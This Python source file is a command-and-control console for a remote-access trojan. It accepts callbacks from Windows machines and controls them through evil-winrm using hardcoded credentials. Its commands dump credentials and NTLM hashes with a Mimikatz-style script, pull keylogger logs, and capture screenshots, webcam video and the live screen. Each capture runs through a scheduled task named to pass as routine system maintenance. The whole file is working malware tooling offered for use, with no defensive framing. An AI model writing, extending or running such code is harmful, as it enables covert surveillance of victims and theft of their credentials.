import subprocess
import sys
import socket
import getpass
import platform
import base64
import time
import ipaddress
from datetime import datetime

BANNER = r"""
                .88888.              888888ba                                    
               d8'   `88             88    `8b                                   
               88                   a88aaaa8P'                                   
               88   YP88  88888888   88   `8b.                                   
               Y8.   .88             88     88                                   
                `88888'              dP     dP                                   
                                                                  
                                                                  
   888888ba  .d888888d888888P  d888888P.88888.  .88888. dP        
   88    `8bd8'    88   88        88  d8'   `8bd8'   `8b88        
  a88aaaa8P'88aaaaa88a  88        88  88     8888     8888        
   88   `8b.88     88   88        88  88     8888     8888        
   88     8888     88   88        88  Y8.   .8PY8.   .8P88        
   dP     dP88     88   dP        dP   `8888P'  `8888P' 88888888P 
                                                                  
                                                                    
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

# Global dictionary to store connected devices
devices = {}

def start_listener(devices_dict):
    """Listen for a single incoming connection and add it to the devices dictionary"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    # Add device to dictionary if not already present
    if target_ip not in devices_dict:
        devices_dict[target_ip] = {
            "ip": target_ip,
            "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "name": f"Device-{len(devices_dict) + 1}"
        }
        print(f"[+] Device added as '{devices_dict[target_ip]['name']}'")
    else:
        print(f"[*] Device already in list as '{devices_dict[target_ip]['name']}'")

    conn.close()
    server.close()

    return target_ip

def list_devices(devices_dict):
    """Display all devices in the dictionary"""
    if not devices_dict:
        print("[-] No devices connected yet. Use 'listen' to wait for connections.")
        return
    
    print("\n" + "="*60)
    print("  Connected Devices")
    print("="*60)
    for idx, (ip, info) in enumerate(devices_dict.items(), 1):
        print(f"  [{idx}] {info['name']} - {ip} (connected: {info['connected_at']})")
    print("="*60 + "\n")

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def ping_target(target_ip, count=1, timeout=2):
    system = platform.system().lower()

    if system == "windows":
        cmd = ["ping", "-n", str(count), "-w", str(timeout * 1000), target_ip]
    else:
        cmd = ["ping", "-c", str(count), "-W", str(timeout), target_ip]

    result = subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return result.returncode == 0

def check_connection(target_ip, timeout=3):
    ports = {
        5985: "WinRM (HTTP)",
        5986: "WinRM (HTTPS)"
    }

    print(f"[*] Checking Connection to {target_ip}...")

    if not ping_target(target_ip):
        print("[-] Ping failed. Host may be down or ICMP blocked.")
        return None

    print("[+] Ping successful. Host is reachable.\n")

    for port, name in ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        try:
            sock.connect((target_ip, port))
            print(f"[+] {name} port {port} is OPEN")
        except socket.timeout:
            print(f"[-] {name} port {port} timed out")
        except ConnectionRefusedError:
            print(f"[-] {name} port {port} is CLOSED")
        except Exception as e:
            print(f"[-] {name} port {port} error: {e}")
        finally:
            sock.close()
    return target_ip

def screenshot(target_ip):
    print("[*] Triggering screenshot task...")

    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        TASK_NAME = "WindowsDisplayUpdate"
        REMOTE_FILE = "C:\\Users\\Public\\screen.png"
        LOCAL_FILE = f"./Box/screen_{target_ip}_{timestamp}.png"
        payload = 'Start-ScheduledTask -TaskName "WindowsDisplayUpdate"'


        subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )


        time.sleep(3)  # give task time to write file

        print("[*] Downloading screenshot...")
        
        payload = f'download "{REMOTE_FILE}" "{LOCAL_FILE}"'

        subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        print("[+] Screenshot saved to ./Box/")
    except:
        print("[-] Failed to save screenshot")

def credential_dump(target_ip):
    print("[*] Executing dump.cmd in the target machine and extracting results...")
    try: 
        payload = "C:\\Users\\Public\\dump.cmd ; Get-Content C:\\Users\\Public\\mimi_output.txt | Select-String '(User\s*:|Hash NTLM:)'"


        result = subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            capture_output=True,
        )
        print(result.stdout)
    except:
       print("[-] Failed to dump credentials")
       
def keylogger(target_ip):
    print("[*] Downloading keylogger logs...")

    try:
        import os
        import shutil
        
        LOCAL_DIR = f"./Box/keylogger_{target_ip}"
        
        # Clear old logs if they exist
        if os.path.exists(LOCAL_DIR):
            shutil.rmtree(LOCAL_DIR)
        os.makedirs(LOCAL_DIR)
        
        # Get list of remote files
        payload = f'Get-ChildItem "C:\\\\Users\\\\Public\\\\Logs" -Filter "*.log" | Select-Object -ExpandProperty Name'
        
        result = subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            capture_output=True
        )
        
        remote_files = [f.strip() for f in result.stdout.split('\n') if f.strip() and f.strip().endswith('.log')]
        
        if not remote_files:
            print("[-] No log files found on remote system")
            return
        
        print(f"[*] Found {len(remote_files)} log files. Downloading...")
        
        # Download all files
        for filename in remote_files:
            remote_path = f"C:\\Users\\Public\\Logs\\{filename}"
            local_path = os.path.join(LOCAL_DIR, filename)
            
            payload = f'download "{remote_path}" "{local_path}"'
            
            subprocess.run(
                ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
                input=payload,
                text=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            print(f"[+] Downloaded {filename}")
        
        print(f"[+] All logs saved to {LOCAL_DIR}/")
            
    except Exception as e:
        print(f"[-] Failed to download keylogger logs: {e}")

def webcam(target_ip):
    print(f"[*] Triggering webcam stream task on {target_ip} ...")
    payload = f'Start-ScheduledTask -TaskName "DiskHealthCheck"'
    try:
        result = subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload + "\nexit\n",
            text=True,
            capture_output=True,
            timeout=15
        )
        if result.returncode == 0:
            print("[+] Task trigger command sent successfully")
            stream_url = f"http://{target_ip}:8080/"
            print("\n" + "═" * 60)
            print(f"   Stream should now be available at:")
            print(f"   {stream_url}")
            print("═" * 60)
            print()
            print(" In another terminal run one of these commands:")
            print()
            print(f"   cvlc {stream_url}")
            
        else:
            print(f"[-] evil-winrm error:\n{result.stderr}")
            
    except Exception as e:
        print(f"[-] Failed to trigger task: {e}")

def kill_webcam(target_ip):
    print(f"[*] Killing VLC process on {target_ip} ...")
    payload = (
        'Get-Process vlc -ErrorAction SilentlyContinue | '
        'Stop-Process -Force'
    )
    try:
        result = subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload + "\nexit\n",
            text=True,
            capture_output=True,
            timeout=15
        )
        if result.returncode == 0:
            print("[+] VLC processes terminated successfully")
        else:
            print(f"[-] evil-winrm error:\n{result.stderr}")
    except Exception as e:
        print(f"[-] Failed to stop process: {e}")

def screen_stream():
    print("[*] Starting screen stream receiver...")
    print("[*] Listening for incoming DXGI screen stream on port 8888...")
    try:
        subprocess.run([sys.executable, "screen_receiver.py"])
    except FileNotFoundError:
        print("[-] screen_receiver.py not found in current directory")
    except KeyboardInterrupt:
        print("\n[*] Screen stream receiver stopped")
    except Exception as e:
        print(f"[-] Error starting screen receiver: {e}")
        

def cli():
    username = getpass.getuser()
    current_target = None
    help_text = """
        Available commands:
        help, h        Show this help menu
        set            Set a target IP address
        show           Show current target
        listen         Start listening for a target (adds to device list)
        list-devices   Show all connected devices
        select         Select a device from the list to use as current target
        check          Check target connectivity (WinRM ports)
        evil-winrm     Connect to target using evil-winrm
        key-logger     To be determined
        screen-shot    Take screenshot
        dump           Credentials dump
        webcam         Monitor the webcam on target
        kill-webcam    Stop VLC webcam process on target
        screen-stream  Receive DXGI screen stream from target
        exit, q        Exit the console
    """
    print("[*] Type help or h to see all commands...\n")
    while True:
        cmd = input(f"{username}@ResearchProject# ")
        if cmd == "exit" or cmd == "q":
            print("[+] Exiting console.")
            break

        elif cmd == "help" or cmd == "h":
            print(help_text)
        
        elif cmd == "set":
            args = input("Type target IP address: ")
            try:
                current_target = str(ipaddress.ip_address(args))
                print(f"[+] Target IP set to {current_target}")
            except ValueError:
                print("[-] Invalid IP address")
                
        elif cmd == "show":
            print(f"Current Target: {current_target}")

        elif cmd == "listen":
            current_target = start_listener(devices)
        
        elif cmd == "list-devices":
            list_devices(devices)
        
        elif cmd == "select":
            if not devices:
                print("[-] No devices available. Use 'listen' to wait for connections.")
            else:
                list_devices(devices)
                try:
                    choice = input("Enter device number to select: ")
                    device_list = list(devices.values())
                    idx = int(choice) - 1
                    if 0 <= idx < len(device_list):
                        current_target = device_list[idx]['ip']
                        print(f"[+] Target set to {device_list[idx]['name']} ({current_target})")
                    else:
                        print("[-] Invalid device number")
                except (ValueError, IndexError):
                    print("[-] Invalid selection")

        elif cmd == "check":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                check_connection(current_target)

        elif cmd == "evil-winrm":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                current_target = connect_evil_winrm(current_target)

        elif cmd == "key-logger":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                keylogger(current_target)

        elif cmd == "screen-shot":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                screenshot(current_target)
        
        elif cmd == "dump":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                credential_dump(current_target)
        
        elif cmd == "webcam":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                webcam(current_target)
        
        elif cmd == "kill-webcam":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                kill_webcam(current_target)
        
        elif cmd == "screen-stream":
            screen_stream()

        elif cmd == "":
            continue

        else:
            print(f"[-] Unknown command: {cmd}")


def main():
    print(BANNER)
    try:
        cli()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    

if __name__ == "__main__":
    main()
